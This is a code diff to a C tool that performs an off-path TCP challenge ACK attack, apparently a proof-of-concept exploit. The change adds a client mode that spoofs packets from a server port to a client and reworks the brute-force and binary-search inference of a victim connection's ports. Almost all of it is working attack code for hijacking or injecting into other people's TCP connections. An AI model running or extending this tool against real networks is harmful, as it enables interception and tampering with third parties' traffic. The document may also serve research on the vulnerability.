@@ -116,6 +116,7 @@ typedef struct thctx_struct {
 	off_t inject_server_len;
 	char *inject_client;
 	off_t inject_client_len;
+	int client_mode;
 } thctx_t;
 
 /* for probing groups of values, limited by PACKETS_PER_SECOND */
@@ -186,6 +187,7 @@ void usage(char *argv0)
 	fprintf(stderr, "usage: %s [options] <server addr> <server port> <client addr>\n",
 			argv0);
 	fprintf(stderr, "\nsupported options:\n\n"
+			"-c <port>      attack the client's connection to this port on the server\n"
 			"-d <usec>      packet delay\n"
 			"-g             automatically start the attack (otherwise type \"start\")\n"
 			"-h             this help, duh.\n"
@@ -216,6 +218,8 @@ int main(int argc, char *argv[])
 	char myhost[512];
 	struct sockaddr_in sin;
 	char *srvfn = NULL, *clifn = NULL;
+	int client_mode = -1;
+	char sport[32], dport[32];
 
 	/* look up this machine's address */
 	if (gethostname(myhost, sizeof(myhost)) == -1) {
@@ -240,7 +244,7 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 
-	while ((c = getopt(argc, argv, "a:d:ghI:i:P:p:r:S:s:A:w:")) != -1) {
+	while ((c = getopt(argc, argv, "a:c:d:ghI:i:P:p:r:S:s:A:w:")) != -1) {
 		switch (c) {
 			case '?':
 			case 'h':
@@ -249,6 +253,14 @@ int main(int argc, char *argv[])
 
 			case 'g':
 				g_ctx.autostart = 1;
+				break;
+
+			case 'c':
+				client_mode = atoi(optarg);
+				if (client_mode < 1 || client_mode > 65535) {
+					fprintf(stderr, "[!] %s is not a valid port.\n", optarg);
+					return 1;
+				}
 				break;
 
 			case 'd':
@@ -423,19 +435,43 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 	g_ctx.legit.dst.sin_port = htons((uint16_t)srvport);
-	g_ctx.spoof.dst.sin_port = htons((uint16_t)srvport);
+	if (client_mode == -1)
+		g_ctx.spoof.dst.sin_port = htons((uint16_t)srvport);
 
-	if (cliport != -1)
-		g_ctx.spoof.src.sin_port = htons(cliport);
-	if (altport != -1)
-		g_ctx.spoof.dst.sin_port = htons(altport);
+	/* for client mode, we need to spoof packets from the specified port on the
+	 * server to the client */
+	strcpy(sport, "TBD");
+	strcpy(dport, "TBD");
+	if (client_mode != -1) {
+		g_ctx.spoof.src.sin_port = htons(client_mode);
+		sprintf(sport, "%u (from -c)", client_mode);
 
-	printf("[*] Launching off-path challenge ACK attack against:\n"
-			"    server: %s:%u\n", inet_ntoa(g_ctx.legit.dst.sin_addr),
+		if (cliport != -1) {
+			g_ctx.spoof.dst.sin_port = htons(cliport);
+			sprintf(dport, "%u (from -p)", cliport);
+		}
+		g_ctx.client_mode = 1;
+	} else {
+		if (cliport != -1) {
+			g_ctx.spoof.src.sin_port = htons(cliport);
+			sprintf(sport, "%u (from -p)", cliport);
+		}
+
+		if (altport != -1) {
+			g_ctx.spoof.dst.sin_port = htons(altport);
+			sprintf(dport, "%u (from -P)", altport);
+		} else {
+			sprintf(dport, "%u", ntohs(g_ctx.spoof.dst.sin_port));
+		}
+	}
+
+	/* show details of the attack before commencing */
+	printf("[*] Launching off-path challenge ACK attack against the connection between:\n");
+	printf("    source: %s:%s\n", inet_ntoa(g_ctx.spoof.src.sin_addr), sport);
+	printf("    destination: %s:%s\n", inet_ntoa(g_ctx.spoof.dst.sin_addr), dport);
+	printf("[*] Sending legit challenge ACKs to: %s:%u\n",
+			inet_ntoa(g_ctx.legit.dst.sin_addr),
 			ntohs(g_ctx.legit.dst.sin_port));
-	printf("    client: %s (port hint: %u)\n",
-			inet_ntoa(g_ctx.spoof.src.sin_addr),
-			ntohs(g_ctx.spoof.src.sin_port));
 	printf("    from: %s\n", inet_ntoa(g_ctx.legit.src.sin_addr));
 	if (g_ctx.spoof.seq)
 		printf("    spoofed sequence: %lu (0x%lx)\n", (u_long)g_ctx.spoof.seq,
@@ -914,8 +950,14 @@ int infer_four_tuple(void)
 	int nchunks = 0, ci = 0;
 	/* binary search vars */
 	u_long bs_start = 0, bs_end = 0, bs_mid = 0;
+	volatile uint16_t *pport;
 
 	gettimeofday(&infer_start, NULL);
+
+	if (g_ctx.client_mode)
+		pport = &(spoof->dst.sin_port);
+	else
+		pport = &(spoof->src.sin_port);
 
 	while (1) {
 		gettimeofday(&round_start, NULL);
@@ -938,12 +980,12 @@ int infer_four_tuple(void)
 		/* if we need to initialize the ranges, do so now */
 		if (test_mode == -1) {
 			/* if we already have a guess, try it first */
-			if (spoof->src.sin_port) {
+			if (*pport) {
 				/* if it hits, we set these equal to signify a win.
 				 *
 				 * we leave guess_mid set to 0 in case we missed..
 				 */
-				bs_mid = bs_start = bs_end = ntohs(spoof->src.sin_port);
+				bs_mid = bs_start = bs_end = ntohs(*pport);
 				test_mode = 0;
 			}
 			/* no initial guess available... */
@@ -977,7 +1019,7 @@ int infer_four_tuple(void)
 			bs_end = sched[ci].end;
 			// XXX: TODO: implement optmization for < 14 ports to probe...
 			for (guess = bs_start; guess < bs_end; guess++) {
-				spoof->src.sin_port = htons(guess);
+				*pport = htons(guess);
 				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
 					return 0;
 				usleep(g_ctx.packet_delay);
@@ -991,7 +1033,7 @@ int infer_four_tuple(void)
 			bs_mid = (bs_start + bs_end) / 2;
 			// XXX: TODO: implement optmization for < 14 ports to probe...
 			for (guess = bs_mid; guess < bs_end; guess++) {
-				spoof->src.sin_port = htons(guess);
+				*pport = htons(guess);
 				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
 					return 0;
 				usleep(g_ctx.packet_delay);
@@ -999,7 +1041,7 @@ int infer_four_tuple(void)
 		}
 
 		/* ensure we only send a single value once */
-		spoof->src.sin_port = 0;
+		*pport = 0;
 
 #ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
 		gettimeofday(&now, NULL);
@@ -1055,7 +1097,7 @@ int infer_four_tuple(void)
 				timersub(&now, &infer_start, &diff);
 				printf("[*] Confirmed client port (from hint): %lu (after %lu %lu)\n",
 						bs_start, diff.tv_sec, diff.tv_usec);
-				spoof->src.sin_port = ntohs(bs_start);
+				*pport = ntohs(bs_start);
 				return 1;
 			} else if (test_mode == 1) {
 				/* proceed to a binary search of this block */
@@ -1065,7 +1107,7 @@ int infer_four_tuple(void)
 					timersub(&now, &infer_start, &diff);
 					printf("[*] Confirmed client port (via chunk): %lu (after %lu %lu)\n",
 							bs_start, diff.tv_sec, diff.tv_usec);
-					spoof->src.sin_port = ntohs(bs_start);
+					*pport = ntohs(bs_start);
 					return 1;
 				}
 				test_mode = 2;
@@ -1076,7 +1118,7 @@ int infer_four_tuple(void)
 					timersub(&now, &infer_start, &diff);
 					printf("[*] Guessed client port (via binary search): %lu (after %lu %lu)\n",
 							bs_mid, diff.tv_sec, diff.tv_usec);
-					spoof->src.sin_port = ntohs(bs_mid);
+					*pport = ntohs(bs_start);
 					return 1;
 				}
 				else
